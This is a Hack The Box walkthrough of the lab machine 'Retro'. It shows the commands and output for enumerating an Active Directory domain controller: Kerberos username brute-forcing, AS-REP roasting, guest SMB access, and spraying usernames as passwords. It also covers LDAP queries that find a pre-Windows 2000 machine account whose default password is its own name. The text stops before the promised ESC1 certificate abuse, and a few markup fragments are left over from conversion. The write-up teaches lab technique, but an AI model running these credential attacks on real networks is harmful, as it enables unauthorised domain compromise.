+++
title = "Retro HTB Walkthrough: Pre-Win2000 Machine Accounts, LDAP Bitmasks & ESC1 Cert Abuse"
draft = false
tags = ["Windows", "HTB", "Hack The Box", "Active Directory", "Domain Controller", "LDAP", "Kerberos", "SMB", "BloodHound", "Certipy", "ESC1", "Certificate Template", "UserAccountControl", "Pre-Windows 2000", "Machine Account", "Impacket", "AS-REP Roasting", "Kerbrute", "Privilege Escalation"]
keywords = ["HTB Retro walkthrough", "pre-Windows 2000 computer account default password", "UserAccountControl 4096 32 4128 bitmask", "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT", "ESC1 certificate abuse with Certipy", "request certificate with UPN administrator", "Impacket getTGT BANKING$", "pass-the-certificate attack", "BloodHound enumeration", "LDAP anonymous bind checks", "SMB guest share trainees password"]
description = "A comprehensive walkthrough of the Retro machine from Hack The Box: enumerate a domain controller over LDAP Kerberos SMB, identify a pre-Windows 2000 machine account via UserAccountControl bitmasks, validate lever TGT workflow, and escalate using an ESC1-vulnerable certificate template in Certipy to impersonate Administrator."
author = "bloodstiller"
date = 2025-09-18
lastmod = 2025-09-18
toc = true
bold = true
next = true
+++

## Retro Hack The Box Walkthrough/Writeup: {#retro-hack-the-box-walkthrough-writeup}

- <https://app.hackthebox.com/machines/Retro>

## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

- **Variables**:

  - In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
    - I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
      - `$box` = The IP of the box
      - `$pass` = Passwords I have access to.
      - `$user` = current user I am enumerating with.
        - Depending on where I am in the process this can change if I move laterally.
      - `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
      - `$machine` = the machine name e.g. `DC01`
    - Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information.

- **Wordlists**:
  - I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
    - I also use these additional wordlists:
      - [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
      - [SecLists](https://github.com/danielmiessler/SecLists)
      - [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)

## 1. Enumeration: {#1-dot-enumeration}

### NMAP: {#nmap}

#### Basic Scans: {#basic-scans}

**TCP**:

```shell
#Command
nmap $box -Pn -oA TCPbasicScan

#Results
Nmap scan report for 10.129.234.44
Host is up (0.034s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```

- **Initial thoughts**: Looks to be a domain controller as we have DNS (`53`) kerberos (`88`) &amp; ldap (`389`, `636`, `3268` &amp; `3269`) running plus SMB &amp; rdp (`3389`)

#### Comprehensive Scans: {#comprehensive-scans}

```shell
#Command
sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP

#Results

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 07:52 BST
Nmap scan report for 10.129.234.44
Host is up (0.023s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-14 06:54:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-14T06:56:22+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-14T06:55:42+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-09-13T06:50:25
|_Not valid after:  2026-03-15T06:50:25
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
54585/tcp open  msrpc         Microsoft Windows RPC
54598/tcp open  msrpc         Microsoft Windows RPC
57425/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57433/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-09-14T06:55:43
|_  start_date: N/A

```

- **Findings**: As we can see it is a DC and it is called `DC.retro.vl` we can also see the local reported kerberos time which is useful as we can sync our clock to it (which is integral for kerberos attacks).

### Updating `/etc/hosts` &amp; Variables: {#updating-etc-hosts-and-variables}

I have a script I use to update variables in my `.zshrc` and as we now know the domain and machine values lets store them.

```shell
update_var domain "retro.vl"
update_var machine "DC"
```

Now, I will update `/etc/hosts` for DNS and &amp; further LDAP Queries.

- I update my `/etc/hosts` file to enable tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration and other tools that require DNS or LDAP for queries:
  ```shell
  sudo echo "$box   $domain $machine.$domain $machine" | sudo tee -a /etc/hosts
  ```

### LDAP `389`: {#ldap-389}

#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.

- We can actually retrieve a significant amount of information via anonymous bind such as:
  - A list of all users
  - A list of all groups
  - A list of all computers.
  - User account attributes.
  - The domain password policy.
  - Enumerate users who are susceptible to AS-REPRoasting.
  - Passwords stored in the description fields

The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here

- <https://github.com/bloodstiller/ldapire>
- <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>

It will dump general information &amp; also detailed &amp; simple information including:

- Groups
- Computers
- Users
- All domain objects
- A file containing all description fields
- It will also search the domain for any service/svc accounts and place them in a folder too.

Let's run it and see what we get back.

```shell
python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass
```

It turns out the anonymous bind is (+NOT+) enabled and we get the below information.

```shell
------------------------------------------------------------
 Server Information
------------------------------------------------------------
  • IP Address  : 10.129.234.44
  • Domain Name : retro.vl
  • Server Name : DC
  • Forest Level: 7
  • Domain Level: 7

------------------------------------------------------------
 Connection Attempts
------------------------------------------------------------
  • Attempting SSL connection...
  ⚠️  Connection established but no read access
  • Attempting non-SSL connection...
  ⚠️  Connection established but no read access

------------------------------------------------------------
 Connection Failed
------------------------------------------------------------
  ⚠️  Could not establish LDAP connection
  • Anonymous bind may be disabled (good security practice)
  • Credentials may be incorrect
  • Server may be unreachable
  • LDAP/LDAPS ports may be filtered

```

The functionality level determines the minimum version of Windows server that can be used for a DC.

Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.

Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

| Functional Level Number | Corresponding OS            |
| ----------------------- | --------------------------- |
| 0                       | Windows 2000                |
| 1                       | Windows Server 2003 Interim |
| 2                       | Windows Server 2003         |
| 3                       | Windows Server 2008         |
| 4                       | Windows Server 2008 R2      |
| 5                       | Windows Server 2012         |
| 6                       | Windows Server 2012 R2      |
| 7                       | Windows Server 2016         |
| 8                       | Windows Server 2019         |
| 9                       | Windows Server 2022         |

- +Note+:
  - Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
  - As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.
  - Any, host OS can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
  - <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>

### Syncing Clocks for Kerberos Exploitation: {#syncing-clocks-for-kerberos-exploitation}

Since Kerberos is enabled on this host, it's best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.

```shell
sudo ntpdate -s $domain
```

+Note+: I am doing this now as we have the DNS name etc.

### DNS `53`: {#dns-53}

Let's use `dnsenum` to find if there are any interesting DNS records being served.

```shell
dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt $domain
```

The entries found are just standard entries on all DC's.
![](/ox-hugo/2025-09-14-084551_.png)

### Kerberos `88`: {#kerberos-88}

#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

Kerbrute is great for bruteforcing usernames/emails when kerberos is running.

```shell
kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt
```

As we can see we have managed to extract two valid emails &amp; usernames. tblack &amp; jburley.
![](/ox-hugo/2025-09-14-083316_.png)

Lets extract the emails for ease:

```shell
awk -F: '{ gsub(/^[ \t]+|[ \t]+$/, "", $4); print $4 }' kerbruteUsers.txt >> KEmails.txt
```

This may look complex but all it does is extract the Emails using `awk` and any leading/trailing whitespace.

Now we need to extract just the usernames:

```shell
awk -F@ '{ print $1 }' KEmails.txt > KUsernames.txt
```

Now we have two files ready for use when credential stuffing or bruteforcing.

#### Using impacket-GetNPUsers for ASReproasting: {#using-impacket-getnpusers-for-asreproasting}

We should always try and asreproast with a null/guest session as it can lead to an easy win.

```shell
impacket-GetNPUsers $domain/ -request
```

No dice this time as we could not make a successful bind.
![](/ox-hugo/2025-09-14-083525_.png)

Lets try with our extracted kerbrute usernames
\#+begin*src shell
impacket-GetNPUsers $domain/ -dc-ip $box -usersfile KUsernames.txt -format hashcat -outputfile asRepHashes.txt -no-pass
\#+end_srmc
Neither of these users have the `PREAUTH` flag set.
![](/ox-hugo/2025-09-14-084502*.png)

### SMB `445`: {#smb-445}

#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold:

```shell
netexec smb $box -u 'guest' -p '' --shares
```

As we can see guest sessions are enabled and we can access the `Trainees` share as a guest.
![](/ox-hugo/2025-09-14-084925_.png)

#### Trying Usernames as Passwords: {#trying-usernames-as-passwords}

I always try usernames as passwords as well.

```shell
netexec smb $box -u KUsernames.txt -p KUsernames.txt --shares --continue-on-success | grep [+]
```

We do not get any hits.

#### Enumerating Users with Impacket-lookupsid: {#enumerating-users-with-impacket-lookupsid}

We can use `impacket-lookupsid` to enumerate users &amp; groups on the domain, well anything that has a SID.

```shell
impacket-lookupsid $domain/guest@$machine.$domain -domain-sids
```

- +Note+: As we are using the "Guest" account we can just hit enter for a blank password

As we can see we have even more usernames now we can add to our usernames list.
![](/ox-hugo/2025-09-14-091644_.png)

We can also see there is a computer account `BANKING$`. Computer accounts are followed by the `$` dollar sign.
![](/ox-hugo/2025-09-14-094155_.png)

I rerun asreproasting and shares checks with the new users but no hits.
![](/ox-hugo/2025-09-14-092314_.png)

#### Enumerating SMB shares using netexec: {#enumerating-smb-shares-using-netexec}

As we have access to a share via the "Guest" account we can spider them to check for interesting files

```shell
netexec smb $box -u "Guest" -p "" -M spider_plus
```

As we can see 1 file was found in the share.
![](/ox-hugo/2025-09-14-085256_.png)

Lets see if there is anything of note:

```shell
cat /home/kali/.nxc/modules/nxc_spider_plus/$box.json
```

We can see it contains a file called `important.txt`.
![](/ox-hugo/2025-09-14-085446_.png)
\#+end_src

#### Using smbclient To Connect To The Trainees Share: {#using-smbclient-to-connect-to-the-trainees-share}

```shell
smbclient -U 'guest' "\\\\$box\\trainees"
```

#### Downloading The Contents of the Trainees share with smbclient: {#downloading-the-contents-of-the-trainees-share-with-smbclient}

Let's download the contents of the share, we can do this from within smbclient.

```shell
mget *
```

![](/ox-hugo/2025-09-14-085711_.png)
+Note+: This prompt is used to get EVERYTHING in a share.

### Discovering All Trainee User Passwords Are The Same {#discovering-all-trainee-user-passwords-are-the-same}

Reading `important.txt` reveals the Admin team has all trainee users sharing one set of credentials. That’s poor security hygiene: accounts should be **individual** so actions are attributable, access is least-privileged, and incidents are containable, this is a big no no.

{{< figure src="/ox-hugo/2025-09-14-092343_.png" >}}

#### Why This Is Risky (And Sloppy): {#why-this-is-risky--and-sloppy}

- **No accountability / audit trail:** Logs show the same principal, making it hard (or impossible) to trace misuse, prove innocence, or meet evidentiary standards.
- **Blast radius on compromise:** One phish/brute-force/shoulder-surf unlocks **every** trainee account.
- **Lockout chain reaction:** Password expiry or account lock hits all trainees at once; support load spikes.
- **Weakens MFA &amp; SSPR flows:** Per-user MFA enrollment, risk-based prompts, or self-service password reset don’t map to a shared identity.
- **Breaks device &amp; conditional access baselines:** You can’t enforce per-user posture (managed device, geo risk, sign-in risk).
- **Impedes incident response:** You can’t selectively disable a single user without impacting everyone; containment is “all or nothing.”
- **Access reviews become meaningless:** You can’t certify “who needs what” if many people are one account.
- **Compliance exposure:** Fails common controls in ISO 27001, SOC 2, CIS, and typical corporate policies requiring unique IDs.
- **Training / HR tracking gaps:** Attendance, performance, or misuse can’t be tied to a person; disciplinary processes get shaky.
- **Secrets &amp; API keys misuse:** Shared mailbox/API tokens tied to that identity become unrotatable without freezing the cohort.

## 2. Foothold {#2-dot-foothold}

### Re-running Usernames as Passwords &amp; Discovering Trainees Password: {#re-running-usernames-as-passwords-and-discovering-trainees-password}

Even though I re-ran my tests earlier with the new updated usernames list I did forget to re-test usernames as passwords. Let's retest.

```shell
 netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+]
```

As we can see the Trainee user has the password set to trainee too.
![](/ox-hugo/2025-09-14-093221_.png)
+Note+: This is why it's so important to re-check and re-run tests once you have updated information.

### Enumerating As Trainee: {#enumerating-as-trainee}

Let's check if the `Trainee` user has access to different shares.

```bash
netexec smb $box -u trainee -p trainee --shares
```

As we can see they have access to the `Notes` share.

#### Accessing the Notes Share: {#accessing-the-notes-share}

We can access the notes share using `smbclient` again.

```bash
smbclient -U 'trainee' "\\\\$box\\Notes"
```

![](/ox-hugo/2025-09-14-093747_.png)
We can see there are two files let's grab them.

```bash
mget *
```

{{< figure src="/ox-hugo/2025-09-14-093817_.png" >}}

Well it turns out the `user.txt` is actually the flag, that was easy.

#### Reading `ToDo.txt`. {#reading-todo-dot-txt-dot}

Reading the note we can see there is an old machine account (which we saw earlier) `BANKING$` let's perform a bloodhound collection to get some more information.

We can also see they say the account was "pre-made" which means there could be setup data for it in the SYSVOL share.
+Note+: Future bloodstiller here, none in the `SYSVOL` :(

### Performing a Bloodhound Collection: {#performing-a-bloodhound-collection}

We can use bloodhound-python to perform a collection to get a better lay of the land.

```shell
bloodhound-python -d $domain -ns $box -c All -u $user -p $pass
```

![](/ox-hugo/2025-09-14-094445_.png)
We then import these into bloodhound for investigation.

#### Bloodhound Findings: {#bloodhound-findings}

- How many domain admins: 2

{{< figure src="/ox-hugo/2025-09-14-095024_.png" >}}

- What users have DC Sync Privileges:

{{< figure src="/ox-hugo/2025-09-14-095046_.png" >}}

- Our users rights:

Not a lot, no outbound object control.

- How many users in the domain:

5 actual users ![](/ox-hugo/2025-09-14-095131_.png)

- Interesting user:

Jburley is a member of the administration group.

- Computer Account:

The machine account `BANKING$` is listed but does not seem to have any outbound control &amp; it's not trusted for delegation.
![](/ox-hugo/2025-09-17-154345_.png)

### Enumerating The CA Using Certipy-ad: {#enumerating-the-ca-using-certipy-ad}

As we have creds now we can also query the CA.

```shell
certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box
```

![](/ox-hugo/2025-09-17-152430_.png)
As we can see there are alot of templates.

#### Discovering a Vulnerable Template: {#discovering-a-vulnerable-template}

We can see the certificate template `RetroClients` is available.
![](/ox-hugo/2025-09-17-153646_.png)

Looking further down we can see it's vulnerable to the ESC1 attack.
![](/ox-hugo/2025-09-17-153735_.png)

This may give us a clear route forward as if we can take over the machine account `BANKING$` we can then use the ESC1 certificate attack to escalate our privileges.

## 3. Privilege Escalation: {#3-dot-privilege-escalation}

### Finding A Valid Privilege Escalation Path: {#finding-a-valid-privilege-escalation-path}

This machine had me stumped for a while as I was not sure where to go next. We had a low level trainee account, but no shell, RDP or write access to any shares. The host also did not appear to be vulnerable to any remote privilege escalation vectors so how were we going to get control of the computer account `BANKING$`.

When I get stuck like this I re-read all my notes and findings as well as any files I have found on the host as it's very easy to get locked into a route we think we should take and end up overlooking clues that are left.

I re-read the note `ToDo.txt` and the lines that stuck out to me were.

> We should start with the pre created
> computer account. That one is older than me.

A quick search later and we get the below result from `TrustedSec`.
![](/ox-hugo/2025-09-16-062444_.png)

### Discovering Pre Windows 2000 Machine Accounts Have Weak Default Passwords: {#discovering-pre-windows-2000-machine-accounts-have-weak-default-passwords}

Reading the article we find out that if a pre-created computer account has the box that says "Assign this computer account as a pre-Windows 2000 computer" ticked it will by default have it's name set as the password in lowercase. So if a computer is called `BANKING$` by default it's password will be `banking`
![](/ox-hugo/Pasted-image-20220427004231.png)

- Image Source: [Trusted-Sec diving-into-pre-created-computer-accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts)

The article also provides a [valuable microsoft link](https://web.archive.org/web/20080205233505/http://support.microsoft.com/kb/320187) from the internet archive where we can see this explained.
![](/ox-hugo/2025-09-16-064511_.png)

+Caveat+: There is one caveat to this though, if someone has onboarded the computer to the domain (had it join the domain) they will be prompted to change the password.

### Determining `UserAccountControl` Flags For Pre Windows 2000 Machine Accounts: {#determining-useraccountcontrol-flags-for-pre-windows-2000-machine-accounts}

Reading the article further we find out that when a computer account is created the following [UserAccountControl](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties) property flags are set for the object.

- `4096` = `WORKSTATION_TRUST_ACCOUNT` (computer account running Microsoft Windows NT 4.0 or Windows 2000)
- `32` = `PASSWD_NOTREQD` (often set on pre-created/prestaged computer accounts)

Once a computer joins the domain the `32` = `PASSWD_NOTREQD` property is dropped, this means we can search for the combined `UserAccountControl` value of `4128` or the seperate values and we should only get pre-created computer accounts that have not been onboarded.

+Important Note+: It is worth noting though adding the numbers (`4096 + 32 = 4128`) and filtering for this exact value can miss accounts that carry extra flags (e.g., disabled, delegation settings). Instead, it's better to test that both bits are present, regardless of any others.

+Important Caveat+: Searching for the Bitwise values of `4096`, `32` or the combined value of `4128` does not mean that only `pre-Windows 2000 computer` accounts are being returned. As according to the article there is currently no way to filter just the computers that have had the `Assign this computer account as a pre-Windows 2000 computer` checkmark set. Instead this search will return all computers which are running legacy versions of microsoft that also do not require the `PASSWD`.

### Searching For Pre Windows 2000 Machine Accounts Using `UserAccountControl` Flags: {#searching-for-pre-windows-2000-machine-accounts-using-useraccountcontrol-flags}

Searching online we can find this entry on [The Hacker Recipes - pre-windows-2000-computers](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers) which details how we can search for computers that match our criteria we should be able to use the below query using `ldapsearch-ad.py`

+Note+: You can install `ldapsearch-ad.py` with the below command.

```shell
pipx install git+https://github.com/yaap7/ldapsearch-ad
```

#### Trying `ldapsearch-ad.py` Recommended Search Terms: {#trying-ldapsearch-ad-dot-py-recommended-search-terms}

Trying the recommended search term as per the article yields no results for me.

```shell
ldapsearch-ad.py -l ldap://$box:389 -d "$domain" -u "$user" -p "$pass" -t search -s '(&(userAccountControl=4128)(logonCount=0))'
```

{{< figure src="/ox-hugo/2025-09-16-122308_.png" >}}

However this is a very simple LDAP search so we should be able to customize the query below and use any tools that accept LDAP queries.

```shell
'(&(userAccountControl=4128)(logonCount=0))'
```

#### LDAP Queries To Search For Pre Windows 2000 Machine Accounts: {#ldap-queries-to-search-for-pre-windows-2000-machine-accounts}

Instead of using the recommended ldap query we can use the below ldap queries using a bitwise matching rule's to match the values we are looking for.

- **LDAP Query**

<!--listend-->

```shell
# Searching For Each Bitwise Value Recommended
(&(objectClass=computer)
(userAccountControl:1.2.840.113556.1.4.803:=4096)
(userAccountControl:1.2.840.113556.1.4.803:=32))

# Searching For Combined Bitwise Value
(&(objectCategory=computer)
(userAccountControl:1.2.840.113556.1.4.803:=4128))
```

#### Using `ldapsearch-ad.py` To Search For Pre Windows 2000 Machine Accounts: {#using-ldapsearch-ad-dot-py-to-search-for-pre-windows-2000-machine-accounts}

We now take the above ldap query and use `ldapsearch-ad.py` again.

```shell
# Specific Match
ldapsearch-ad.py -l ldap://$box:389 -d "$domain" -u "$user" -p "$pass" -t search -s '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32))'
```

As we can see the `banking` computer is listed as expected.
![](/ox-hugo/2025-09-16-123453_.png)

#### Using `ldapsearch` To Search For Pre Windows 2000 Machine Accounts: {#using-ldapsearch-to-search-for-pre-windows-2000-machine-accounts}

As I said above, we are just sending an ldap query so we can also just use good ol' reliable `ldapsearch`.

- **Export the base DN**:

For this to work we need to export the DN so we can pass it to `ldapsearch`.

```shell
  #First we need to extract the base DN from our domain variable
  base_dn="$(awk -F. '{for(i=1;i<=NF;i++) printf "DC=%s,", $i; print ""}' <<<"$domain" | sed 's/,$//')"

  # You can also just manually export the values to a var like below
  base_dn="DC=[base],DC=[dn]"
  # Example
  base_dn="DC=retro,DC=vl"
```

- **Run ldap query using `ldapsearch`**:
  Next we run our query

  ```shell
    ldapsearch -x -H ldap://$box:389 \
      -D "$user@$domain" -w "$pass" \
      -b "$base_dn" -s sub \
       '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32))'

  #Using SSL
    ldapsearch -x -H ldaps://$box:636 \
      -D "$user@$domain" -w "$pass" \
      -b "$base_dn" -s sub \
       '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32))'
   -o tls_reqcert=never
  ```

  ![](/ox-hugo/2025-09-16-123829_.png)
  +Note On SSL/TLS+: I have included the `-o tls_reqcert=never` argument here as this DC is using a self-signed cert so won't work without it as there is no actual trusted CA. This flag essentially says "Don't check if the expiry or hostnames match just encrypt the traffic and go".

#### Using pre2k To Search For Pre Windows 2000 Machine Accounts: {#using-pre2k-to-search-for-pre-windows-2000-machine-accounts}

I also found the tool [pre2k](https://github.com/garrettfoster13/pre2k) when researching tools for this issue so I will cover it here also as it's well made.

- **Install pre2k and dependencies**:

<!--listend-->

```shell
git clone https://github.com/garrettfoster13/pre2k.git
cd pre2k/
python3 -m venv 2k
source 2k/bin/activate
pip3 install .
```

- **Running pre2k to look for windows machines**:

<!--listend-->

```shell
pre2k auth -u $user -p $pass -d $domain -dc-ip $box
```

As we can see we get a hit as expected.
![](/ox-hugo/2025-09-16-125429_.png)

### Validating `BANKING$` password With `netexec`: {#validating-banking-password-with-netexec}

Now we know that that the `BANKING$` host has the name set as the password let's validate it with netexec.

```shell
netexec smb $box -u 'BANKING$' -p 'banking' --shares
```

As we can see we get the error `STATUS_NOLOGON_WORKSTATION_TRUST`
[[![](/ox-hugo/2025-09-16-125817_.png)]\*\* Side Quest: What Is A `STATUS_NOLOGON_WORKSTATION_TRUST` Error?

Referring back to the TrustedSec article, we’re told the below.

> You will see the error message STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT when you have guessed the correct password for a computer account that has not been used yet.

### Side Quest: What Is A `STATUS_NOLOGON_WORKSTATION_TRUST` Error? {#side-quest-what-is-a-status-nologon-workstation-trust-error}

If we check [Microsoft’s protocol docs](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/a6969cdd-5441-4cf9-bcaa-4b7ffbf792b7), we see the domain controller (DC) returns this status when an NTLM network logon is attempted using a computer account without the expected “workstation trust” context (the Netlogon secure channel / proper flags). In that case, AD won’t validate the sub-authentication package and responds with `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.

Specifically it says:

> If the account is a computer account, the subauthentication package is not verified, and the K bit of LogonInformation.LogonNetwork.Identity.ParameterControl is not set, then return STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT

But what does this mean? If we check the linked note reference beside it we can see it says.

> In Windows NT, the DC cannot authenticate computer accounts.

That line can be misleading if read literally. It’s not simply about “NT-only” behavior; it’s about whether the workstation trust (secure channel) exists for that computer account during a network logon.

Microsoft's [[ [NTSTATUS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55?) table also spells out the code and message:
`0xC0000199 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` -&gt; "The account used is a computer account. Use your global user account or local user account to access this server."

+In Simple Terms+: We found the right machine password, but because the computer hasn’t established its domain trust (no Netlogon secure channel / wrong logon path), AD refuses a normal NTLM network logon and returns `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.

#### Why The Machine Account Is Blocked: {#why-the-machine-account-is-blocked}

When we try and connect a **pre-created, not-yet-joined** computer account using its password (the lowercase sAMAccountName), the DC recognizes the account type and the password as valid, but blocks a plain NTLM network logon because there’s no workstation trust (no secure channel / right flags).

+In Simple Terms+: Password is correct but the logon path is wrong. We’ll see `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` instead of `STATUS_LOGON_FAILURE` (which indicates a wrong password).

#### Why Pre-created Accounts Trigger The Error: {#why-pre-created-accounts-trigger-the-error}

A pre-staged computer object exists in AD, but the machine hasn’t actually joined yet, so there’s no Netlogon secure-channel secret. If we try to authenticate directly with that computer account over NTLM, AD refuses and returns `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` even when the password is correct.

#### A Note About Windows NT: {#a-note-about-windows-nt}

That “Windows NT” note is (for) historical context, not a strict version gate. The operative concept is workstation trust. You can still hit this today on modern domains (for example the domain TrustedSec was testing) when services (NAS/CIFS/SMB endpoints, etc.) reject raw computer-account network logons unless the machine has an established trust channel (or the service explicitly allows the scenario). The same status appears because the login is missing an established machine trust.

#### Quick Reference Error-Code Compass (when poking at machine creds): {#quick-reference-error-code-compass--when-poking-at-machine-creds}

- **Correct machine password, wrong logon path**:

  - `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` (`0xC0000199`)

- **Wrong password**:

  - `STATUS_LOGON_FAILURE` (`0xC000006D`)

- **Account disabled / expired / other**:

  - `STATUS_ACCOUNT_DISABLED`, `STATUS_ACCOUNT_EXPIRED`, etc.

- **DC (server) trust variant for DC accounts**:
  - `STATUS_NOLOGON_SERVER_TRUST_ACCOUNT` (`0xC000019A`)

### Changing The Password Of `BANKING$` A Pre-Windows 2000 Machine: {#changing-the-password-of-banking-a-pre-windows-2000-machine}

So reading the article further it says we can change the password using a number of methods. However this article is quite outdated so checking [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers) we can see it references a pull request for [impackets rpcchangepwd.py](https://github.com/fortra/impacket/pull/1304) which if we check was merged into `impacket-changepasswd`.
